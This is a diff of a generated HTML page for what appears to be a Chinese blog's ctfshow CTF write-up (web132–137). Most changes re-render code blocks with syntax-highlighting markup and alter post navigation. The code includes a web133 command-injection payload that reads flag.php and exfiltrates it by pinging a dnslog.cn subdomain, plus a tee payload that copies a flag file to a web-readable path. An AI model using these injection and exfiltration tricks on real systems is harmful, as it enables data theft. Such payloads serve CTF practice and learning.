@@ -470,7 +470,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.8k
+                    4.7k
                 </div>
                 
 
@@ -871,7 +871,7 @@ aps <span class="token operator">=</span> <span class="token number">100000</spa
 <h2 id="we-b132"><a href="#we-b132" class="headerlink" title="we b132"></a>we b132</h2><p>逻辑运算</p>
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gshfiopvarj30tv09jdh2.jpg" alt="image-20210715103326463"></p>
 <h2 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h2><p>dns数据外带,访问<code>dns.log</code></p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">F&#x3D;&#96;$F&#96;; ping &#96;cat flag.php | grep ctfshow | tr -cd &quot;[a-z]&quot;&#x2F;&quot;[0-9]&quot;&#96;.ywukah.dnslog.cn -c 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token assign-left variable">F</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span><span class="token punctuation">;</span> <span class="token function">ping</span> <span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> flag.php <span class="token operator">|</span> <span class="token function">grep</span> ctfshow <span class="token operator">|</span> <span class="token function">tr</span> -cd <span class="token string">"[a-z]"</span>/<span class="token string">"[0-9]"</span><span class="token variable">`</span></span>.ywukah.dnslog.cn -c <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <pre class="line-numbers language-`相当于shell_code,但是这个函数没有回显" data-language="`相当于shell_code,但是这个函数没有回显"><code class="language-`相当于shell_code,但是这个函数没有回显">
 ![image-20210715112031402](https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;large&#x2F;008i3skNly1gshgvnjvdsj30yf07h0u2.jpg)
@@ -921,15 +921,15 @@ a <span class="token operator">=</span> <span class="token keyword">array</span>
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gshn65o59yj30xs0bc409.jpg" alt="image-20210715145810799"></p>
 <p>nl命令查看文件，<code>awk</code>过滤行数找到<code>flag</code>的具体位置，<code>tr -cd</code> 匹配<code>flag</code></p>
 <h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><p>shell命令tee：</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ls | tee 1.txt           &#x2F;&#x2F;将ls的执行结果保存到1.txt中(覆盖)
-ls | tee -a 1.txt        &#x2F;&#x2F;将执行结果追加到1.txt
-ls ｜ tee 1.txt 2.txt    &#x2F;&#x2F;将执行结果同时保存在1.txt和2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ls</span> <span class="token operator">|</span> <span class="token function">tee</span> <span class="token number">1</span>.txt           //将ls的执行结果保存到1.txt中<span class="token punctuation">(</span>覆盖<span class="token punctuation">)</span>
+<span class="token function">ls</span> <span class="token operator">|</span> <span class="token function">tee</span> -a <span class="token number">1</span>.txt        //将执行结果追加到1.txt
+<span class="token function">ls</span> ｜ <span class="token function">tee</span> <span class="token number">1</span>.txt <span class="token number">2</span>.txt    //将执行结果同时保存在1.txt和2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>与<code>&gt;</code>不同的是<code>tee</code>重定向之后会在终端显示结果</p>
 <p>Payload:</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ls &#x2F; | tee 1
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ls</span> / <span class="token operator">|</span> <span class="token function">tee</span> <span class="token number">1</span>
 访问1
-cat &#x2F;f149_15_h3r3 ｜ tee 2  &#x2F;&#x2F;根目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<span class="token function">cat</span> /f149_15_h3r3 ｜ <span class="token function">tee</span> <span class="token number">2</span>  //根目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsho6gn6okj30qh0a43zo.jpg" alt="image-20210715153307971"></p>
 <p><code>Static</code>方法不需要对象即可调用，调用方式<code>class::function</code></p>
@@ -1000,67 +1000,67 @@ cat &#x2F;f149_15_h3r3 ｜ tee 2  &#x2F;&#x2F;根目录<span aria-hidden="true" 
 <ol>
 <li>用法1</li>
 </ol>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">awk &#39;&#123;[pattern] action&#125;&#39; &#123;filenames&#125;   # 行匹配语句 awk &#39;&#39; 只能用单引号
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">awk</span> <span class="token string">'&#123;[pattern] action&#125;'</span> <span class="token punctuation">&#123;</span>filenames<span class="token punctuation">&#125;</span>   <span class="token comment"># 行匹配语句 awk '' 只能用单引号</span>
 
  每行按空格或TAB分割，输出文本中的1、4项
- $ awk &#39;&#123;print $1,$4&#125;&#39; log.txt
+ $ <span class="token function">awk</span> <span class="token string">'&#123;print <span class="token variable">$1</span>,<span class="token variable">$4</span>&#125;'</span> log.txt
  ---------------------------------------------
- 2 a
- 3 like
- This&#39;s
+ <span class="token number">2</span> a
+ <span class="token number">3</span> like
+ This<span class="token string">'s
  10 orange,apple,mongo
  # 格式化输出
- $ awk &#39;&#123;printf &quot;%-8s %-10s\n&quot;,$1,$4&#125;&#39; log.txt
+ $ awk '</span><span class="token punctuation">&#123;</span>printf <span class="token string">"%-8s %-10s<span class="token entity" title="\n">\n</span>"</span>,<span class="token variable">$1</span>,<span class="token variable">$4</span><span class="token punctuation">&#125;</span><span class="token string">' log.txt
  ---------------------------------------------
  2        a
  3        like
- This&#39;s
- 10       orange,apple,mongo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+ This'</span>s
+ <span class="token number">10</span>       orange,apple,mongo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gshr5iluepj30fv028dft.jpg" alt="image-20210715171559817"></p>
 <ol start="2">
 <li>用法2:</li>
 </ol>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">awk -F  #-F相当于内置变量FS, 指定分割字符
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">awk</span> -F  <span class="token comment">#-F相当于内置变量FS, 指定分割字符</span>
 
- awk -F, &#39;&#123;print $1,$2&#125;&#39;   log.txt
+ <span class="token function">awk</span> -F, <span class="token string">'&#123;print <span class="token variable">$1</span>,<span class="token variable">$2</span>&#125;'</span>   log.txt
  ---------------------------------------------
- 2 this is a test
- 3 Are you like awk
- This&#39;s a test
+ <span class="token number">2</span> this is a <span class="token builtin class-name">test</span>
+ <span class="token number">3</span> Are you like <span class="token function">awk</span>
+ This<span class="token string">'s a test
  10 There are orange apple
  # 或者使用内建变量
- $ awk &#39;BEGIN&#123;FS&#x3D;&quot;,&quot;&#125; &#123;print $1,$2&#125;&#39;     log.txt
+ $ awk '</span>BEGIN<span class="token punctuation">&#123;</span>FS<span class="token operator">=</span><span class="token string">","</span><span class="token punctuation">&#125;</span> <span class="token punctuation">&#123;</span>print <span class="token variable">$1</span>,<span class="token variable">$2</span><span class="token punctuation">&#125;</span><span class="token string">'     log.txt
  ---------------------------------------------
  2 this is a test
  3 Are you like awk
- This&#39;s a test
- 10 There are orange apple
- # 使用多个分隔符.先使用空格分割，然后对分割结果再使用&quot;,&quot;分割
- $ awk -F &#39;[ ,]&#39;  &#39;&#123;print $1,$2,$5&#125;&#39;   log.txt
+ This'</span>s a <span class="token builtin class-name">test</span>
+ <span class="token number">10</span> There are orange apple
+ <span class="token comment"># 使用多个分隔符.先使用空格分割，然后对分割结果再使用","分割</span>
+ $ <span class="token function">awk</span> -F <span class="token string">'[ ,]'</span>  <span class="token string">'&#123;print <span class="token variable">$1</span>,<span class="token variable">$2</span>,<span class="token variable">$5</span>&#125;'</span>   log.txt
  ---------------------------------------------
- 2 this test
- 3 Are awk
- This&#39;s a
- 10 There apple<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+ <span class="token number">2</span> this <span class="token builtin class-name">test</span>
+ <span class="token number">3</span> Are <span class="token function">awk</span>
+ This's a
+ <span class="token number">10</span> There apple<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <ol start="3">
 <li>用法3</li>
 </ol>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">awk -v  # 设置变量
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">awk</span> -v  <span class="token comment"># 设置变量</span>
 
-$ awk -va&#x3D;1 &#39;&#123;print $1,$1+a&#125;&#39; log.txt
+$ <span class="token function">awk</span> -va<span class="token operator">=</span><span class="token number">1</span> <span class="token string">'&#123;print <span class="token variable">$1</span>,<span class="token variable">$1</span>+a&#125;'</span> log.txt
  ---------------------------------------------
- 2 3
- 3 4
- This&#39;s 1
+ <span class="token number">2</span> <span class="token number">3</span>
+ <span class="token number">3</span> <span class="token number">4</span>
+ This<span class="token string">'s 1
  10 11
- $ awk -va&#x3D;1 -vb&#x3D;s &#39;&#123;print $1,$1+a,$1b&#125;&#39; log.txt
+ $ awk -va=1 -vb=s '</span><span class="token punctuation">&#123;</span>print <span class="token variable">$1</span>,<span class="token variable">$1</span>+a,<span class="token variable">$1b</span><span class="token punctuation">&#125;</span><span class="token string">' log.txt
  ---------------------------------------------
  2 3 2s
  3 4 3s
- This&#39;s 1 This&#39;ss
- 10 11 10s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+ This'</span>s <span class="token number">1</span> This'ss
+ <span class="token number">10</span> <span class="token number">11</span> 10s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gshrbchrqyj60ui0hpta502.jpg" alt="image-20210715172134933"></p>
 <p><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-awk.html">awk教程</a></p>
@@ -2737,18 +2737,17 @@ document.body.addEventListener('click', function(e) {
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/07/17/7009.html">
+                <a href="/2021/07/18/0.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="ctfshow-php特性">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
                         
-                        <span class="card-title">ctfshow-php特性</span>
+                        <span class="card-title"></span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -2758,9 +2757,9 @@ document.body.addEventListener('click', function(e) {
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-17
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-18
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -2768,15 +2767,6 @@ document.body.addEventListener('click', function(e) {
                             
                         </span>
                     </div>
-                </div>
-
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/CTFSHOW/">
-                        <span class="chip bg-color">CTFSHOW</span>
-                    </a>
-                    
                 </div>
                 
             </div>
